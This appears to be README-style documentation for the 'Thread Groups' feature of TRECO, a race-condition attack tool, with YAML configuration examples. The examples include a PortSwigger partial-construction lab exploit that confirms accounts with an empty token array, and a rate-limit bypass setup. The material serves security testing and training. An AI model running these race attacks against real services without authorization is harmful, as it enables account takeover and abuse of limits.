# Thread Groups Feature

## Overview

**Thread Groups** is a powerful feature that allows you to define multiple groups of threads with distinct request patterns, thread counts, and delays within a single race condition attack. This eliminates redundant input lists and provides cleaner, more maintainable race configuration syntax.

## Table of Contents

- [Why Thread Groups?](#why-thread-groups)
- [Basic Usage](#basic-usage)
- [Configuration](#configuration)
- [Context Variables](#context-variables)
- [Examples](#examples)
- [Migration Guide](#migration-guide)
- [Advanced Features](#advanced-features)

## Why Thread Groups?

### The Problem

Before thread groups, defining multiple threads with different requests required repeating data across large input arrays:

```yaml
# ❌ OLD APPROACH (Redundant - 150+ lines)
race_attack:
  input:
    endpoint:
      - "/register"
      - "/confirm?token[]="
      - "/confirm?token[]="
      # ... repeat 50x
    
    body:
      - "csrf={{ csrf }}&username=..."
      - ""
      - ""
      # ... repeat 50x
  
  race:
    threads: 51
    input_mode: distribute
```

**Issues:**
- ❌ 150+ lines of repetitive lists
- ❌ Error-prone (easy to miscount)
- ❌ Hard to maintain
- ❌ No semantic grouping
- ❌ Difficult to adjust thread counts
- ❌ No per-group delays

### The Solution

Thread groups allow you to define distinct request patterns with specific thread counts and delays:

```yaml
# ✅ NEW APPROACH (Clean - 20 lines)
race_attack:
  race:
    sync_mechanism: barrier
    connection_strategy: multiplexed
    
    thread_groups:
      - name: registration
        threads: 1
        delay_ms: 0
        request: |
          POST /register HTTP/1.1
          Host: {{ target.host }}
          
          csrf={{ csrf }}&username={{ username }}
      
      - name: confirmations
        threads: 50
        delay_ms: 10
        request: |
          POST /confirm?token[]= HTTP/1.1
          Host: {{ target.host }}
```

**Benefits:**
- ✅ 90% less code
- ✅ Clear semantic grouping
- ✅ Easy to adjust thread counts
- ✅ Per-group delays
- ✅ Per-group logging/assertions
- ✅ All threads under same barrier

## Basic Usage

### Minimal Example

```yaml
states:
  race_attack:
    description: "Simple thread groups example"
    
    request: ""  # Not used when thread_groups is specified
    
    race:
      sync_mechanism: barrier
      connection_strategy: multiplexed
      
      thread_groups:
        - name: group_a
          threads: 5
          request: |
            GET /api/endpoint1 HTTP/1.1
            Host: {{ target.host }}
        
        - name: group_b
          threads: 10
          request: |
            GET /api/endpoint2 HTTP/1.1
            Host: {{ target.host }}
    
    next:
      - goto: end
```

## Configuration

### Thread Group Schema

Each thread group in the `thread_groups` array has the following fields:

| Field | Type | Required | Default | Description |
|-------|------|----------|---------|-------------|
| `name` | string | Yes | - | Group identifier (used in logging and context) |
| `threads` | integer | Yes | - | Number of threads in this group (min: 1, max: 1000) |
| `delay_ms` | integer | No | 0 | Delay in milliseconds AFTER barrier release |
| `request` | string | Yes | - | HTTP request template for this group (supports Jinja2) |
| `variables` | object | No | {} | Optional group-specific variables |

### Execution Model

```
1. Calculate total threads: sum(group.threads for all groups)

2. Create barrier with total thread count

3. For each group:
   - Create group.threads thread instances
   - Each thread:
     a. Wait at barrier
     b. Barrier releases (all threads start simultaneously)
     c. Apply group.delay_ms (if > 0)
     d. Render request with group context
     e. Send request

4. All threads execute under same barrier synchronization
```

### Backward Compatibility

Thread groups are **100% backward compatible**. Existing configurations continue to work:

```yaml
# Legacy mode (still supported)
race:
  threads: 10
  input_mode: distribute

# Thread groups mode (new)
race:
  thread_groups:
    - name: group1
      threads: 10
      request: |
        GET /api HTTP/1.1
```

**Detection logic:**
- If `thread_groups` is present → Use thread groups executor
- Otherwise → Use legacy executor

## Context Variables

When using thread groups, the following variables are available in request templates:

### Group Context

```yaml
{{ group.name }}        # Group name (e.g., "registration")
{{ group.threads }}     # Total threads in this group
{{ group.delay_ms }}    # Configured delay for this group
{{ group.variables }}   # Group-specific variables (dict)
```

### Thread Context

```yaml
{{ thread.id }}         # Global thread ID (0 to total_threads-1)
{{ thread.group_id }}   # Local thread ID within group (0 to group.threads-1)
{{ thread.count }}      # Total number of threads across all groups
```

### Example Usage

```yaml
request: |
  POST /api/{{ group.name }} HTTP/1.1
  Host: {{ target.host }}
  X-Thread-ID: {{ thread.id }}
  X-Group-Thread-ID: {{ thread.group_id }}
  X-Group-Name: {{ group.name }}
  
  {
    "group": "{{ group.name }}",
    "thread": {{ thread.id }},
    "api_key": "{{ group.variables.api_key }}"
  }
```

## Examples

### Example 1: PortSwigger Partial Construction Lab

Demonstrates the classic partial construction race condition where one thread creates an object with `token=NULL` and 50 threads simultaneously attempt to confirm.

```yaml
race_attack:
  description: "Exploit partial construction"
  
  race:
    sync_mechanism: barrier
    connection_strategy: multiplexed
    
    thread_groups:
      # Creates user with token=NULL
      - name: registration
        threads: 1
        delay_ms: 0
        request: |
          POST /register HTTP/1.1
          Host: {{ target.host }}
          Content-Type: application/x-www-form-urlencoded
          
          csrf={{ csrf }}&username={{ username }}&email={{ email }}
      
      # Exploit the NULL token race window
      - name: confirmations
        threads: 50
        delay_ms: 10  # Wait 10ms after barrier
        request: |
          POST /confirm?token[]= HTTP/1.1
          Host: {{ target.host }}
          Content-Length: 0
```

**Full example:** [`examples/portswigger/partial-construction-race/attack.yaml`](../examples/portswigger/partial-construction-race/attack.yaml)

### Example 2: API Rate Limiting Bypass

Test if rate limiting can be bypassed by sending requests from different endpoints simultaneously.

```yaml
rate_limit_test:
  race:
    thread_groups:
      - name: api_v1
        threads: 20
        delay_ms: 0
        request: |
          GET /api/v1/data HTTP/1.1
          Host: {{ target.host }}
          X-API-Key: {{ api_key }}
      
      - name: api_v2
        threads: 20
        delay_ms: 0
        request: |
          GET /api/v2/data HTTP/1.1
          Host: {{ target.host }}
          X-API-Key: {{ api_key }}
```

### Example 3: Group-Specific Variables

Use different API keys for different groups:

```yaml
race_attack:
  race:
    thread_groups:
      - name: admin_requests
        threads: 5
        delay_ms: 0
        variables:
          api_key: "admin-secret-key"
          role: "admin"
        request: |
          POST /api/resource HTTP/1.1
          Host: {{ target.host }}
          Authorization: Bearer {{ group.variables.api_key }}
          
          {"role": "{{ group.variables.role }}"}
      
      - name: user_requests
        threads: 15
        delay_ms: 0
        variables:
          api_key: "user-public-key"
          role: "user"
        request: |
          POST /api/resource HTTP/1.1
          Host: {{ target.host }}
          Authorization: Bearer {{ group.variables.api_key }}
          
          {"role": "{{ group.variables.role }}"}
```

### Example 4: Sequential Attack Phases

Use delays to create sequential attack phases within the race:

```yaml
race_attack:
  race:
    thread_groups:
      # Phase 1: Create resources (immediate)
      - name: create
        threads: 10
        delay_ms: 0
        request: |
          POST /api/resources HTTP/1.1
          ...
      
      # Phase 2: Read resources (wait 50ms)
      - name: read
        threads: 20
        delay_ms: 50
        request: |
          GET /api/resources HTTP/1.1
          ...
      
      # Phase 3: Delete resources (wait 100ms)
      - name: delete
        threads: 10
        delay_ms: 100
        request: |
          DELETE /api/resources HTTP/1.1
          ...
```

## Migration Guide

### Converting from Legacy to Thread Groups

**Before (Legacy):**

```yaml
race_attack:
  input:
    endpoint:
      - "/register"
      - "/confirm"
      - "/confirm"
      - "/confirm"
      - "/confirm"
  
  race:
    threads: 5
    input_mode: distribute
  
  request: |
    POST {{ endpoint }} HTTP/1.1
    Host: {{ target.host }}
```

**After (Thread Groups):**

```yaml
race_attack:
  race:
    thread_groups:
      - name: registration
        threads: 1
        request: |
          POST /register HTTP/1.1
          Host: {{ target.host }}
      
      - name: confirmations
        threads: 4
        request: |
          POST /confirm HTTP/1.1
          Host: {{ target.host }}
```

### When to Use Thread Groups

Use thread groups when:
- ✅ You need different request templates for different threads
- ✅ You need different delays for different thread groups
- ✅ You want clearer semantic grouping
- ✅ You want to avoid repetitive input lists

Keep legacy mode when:
- ✅ All threads send the same request
- ✅ You use input distribution (distribute, product, random modes)
- ✅ Simple race with uniform thread behavior

## Advanced Features

### Total Thread Count

The total number of threads is automatically calculated:

```yaml
thread_groups:
  - name: g1
    threads: 5
  - name: g2
    threads: 10
  - name: g3
    threads: 15

# Total threads: 5 + 10 + 15 = 30
```

### Group Context in Logging

Access group information in logger templates:

```yaml
logger:
  on_state_leave: |
    {% for result in race_attack %}
      Thread {{ result.thread.id }} 
      ({{ result.group.name }}:{{ result.thread.group_id }}): 
      {{ result.status }}
    {% endfor %}
```

### Combining with State Input

Thread groups work alongside state-level input:

```yaml
entrypoint:
  state: race_attack
  input:
    username: "attacker"
    csrf_token: "abc123"

states:
  race_attack:
    race:
      thread_groups:
        - name: group1
          threads: 5
          request: |
            POST /api HTTP/1.1
            
            username={{ username }}&csrf={{ csrf_token }}
```

### Session Isolation

Each thread group can use different sessions by omitting cookies:

```yaml
thread_groups:
  # Uses session from context
  - name: with_session
    threads: 1
    request: |
      POST /api HTTP/1.1
      Cookie: session={{ session }}
  
  # No session (avoids PHP session locking)
  - name: without_session
    threads: 50
    request: |
      POST /api HTTP/1.1
```

## Best Practices

1. **Naming Convention**: Use descriptive group names (e.g., `registration`, `confirmations`, `validation`)

2. **Delay Strategy**: 
   - Use `delay_ms: 0` for groups that should execute immediately after barrier
   - Use small delays (10-50ms) for groups that need slight offset
   - Use larger delays (100-500ms) for sequential phases

3. **Thread Count**: 
   - Start with smaller thread counts for testing
   - Gradually increase for production exploits
   - Balance between effectiveness and noise

4. **Request Templates**:
   - Keep templates clean and readable
   - Use group variables for configuration
   - Leverage template context for dynamic values

5. **Debugging**:
   - Use logger templates to track group execution
   - Monitor thread IDs to verify distribution
   - Check timing to ensure proper synchronization

## Troubleshooting

### Issue: Threads not synchronized properly

**Solution**: Ensure you're using `sync_mechanism: barrier` for thread groups:

```yaml
race:
  sync_mechanism: barrier  # Required for tight synchronization
  thread_groups: [...]
```

### Issue: Delays not working as expected

**Solution**: Remember delays are applied AFTER the barrier releases:

```
Barrier → Group A (0ms delay) → Execute immediately
       → Group B (10ms delay) → Wait 10ms → Execute
```

### Issue: Cannot access group variables

**Solution**: Ensure variables are defined in the group configuration:

```yaml
thread_groups:
  - name: test
    threads: 5
    variables:
      key: "value"
    request: |
      {{ group.variables.key }}  # ✓ Works
```

## API Reference

See the [JSON Schema](../schema/treco-config.schema.json) for complete API reference:

- **ThreadGroup Object**: Line ~297
- **RaceConfig with thread_groups**: Line ~239

## Contributing

Found a bug or have a feature request? Please open an issue on [GitHub](https://github.com/maycon/TRECO/issues).

## License

This feature is part of TRECO and licensed under the MIT License.
